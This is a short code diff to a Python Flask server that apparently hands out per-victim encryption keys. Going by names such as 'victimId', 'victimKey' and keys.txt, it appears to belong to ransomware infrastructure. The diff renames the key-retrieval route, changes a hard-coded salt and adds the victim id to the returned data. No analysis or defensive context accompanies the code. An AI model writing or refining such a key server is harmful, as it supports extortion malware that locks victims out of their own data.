@@ -4,10 +4,10 @@ import secrets
 app = Flask(__name__)
 
 keyFile = 'keys.txt'
-staticSalt = 'valeggiosulminci'
+staticSalt = '0202020202020202'
 
-@app.route('/getKey')
-def getKey():
+@app.route('/get')
+def get():
     victimId = None
     victimKey = None
 
@@ -23,6 +23,7 @@ def getKey():
     keysFile.close()
 
     return {
+        'id': victimId,
         'key': victimKey,
         'salt': staticSalt
     }
